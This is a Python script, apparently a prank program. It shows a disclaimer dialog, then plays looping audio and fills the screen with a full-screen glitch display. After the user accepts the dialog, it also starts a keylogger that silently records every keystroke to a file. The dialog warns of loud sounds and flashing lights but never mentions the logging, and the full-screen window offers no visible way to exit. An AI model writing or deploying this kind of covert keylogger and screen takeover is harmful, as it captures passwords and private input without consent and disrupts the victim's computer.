import tkinter as tk
from tkinter import messagebox
import random
import threading
import time
import pygame
from pynput import keyboard

# === Keylogger ===
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def play_sound():
    pygame.init()
    pygame.mixer.init()
    try:
        pygame.mixer.music.load("music.mp3")
        pygame.mixer.music.play(-1)
        while True:
            time.sleep(1)
    except Exception as e:
        print("Sound error:", e)

def show_windows_warning():
    root = tk.Tk()
    root.withdraw()

    message = (
        """!!! WARNING !!!

The creator of this program is NOT responsible for any damage, data loss, or consequences caused by running this software.

By continuing to run this program, YOU ACCEPT all risks involved.

This program has LOUD SOUNDS and may cause your computer to become unresponsive.

Please ensure you have saved all important work before proceeding.

If you have epilepsy or are sensitive to flashing lights, DO NOT RUN THIS PROGRAM.

Please consider to close all other applications before running this program.

Please use an isolated environment (like a virtual machine) to run this program.

This program can break your speaker, headphones, or other audio devices.

If you are not comfortable with these risks, please close this program now.

THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY
    """)

    proceed = messagebox.askokcancel("Warning", message)

    root.destroy()
    return proceed

def glitch_fullscreen():
    charset = "01@#$%&*ABCDEFG"
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    text = tk.Label(root, font=("Courier", 20), fg="lime", bg="black", justify="left")
    text.pack(expand=True, fill="both")

    def update_text():
        while True:
            lines = "\n".join(
                "".join(random.choice(charset) for _ in range(120))
                for _ in range(40)
            )
            text.config(text=lines)
            time.sleep(0.05)

    threading.Thread(target=update_text, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if show_windows_warning():
        start_keylogger()
        threading.Thread(target=play_sound, daemon=True).start()
        glitch_fullscreen()
    else:
        print("User canceled. Exiting program.")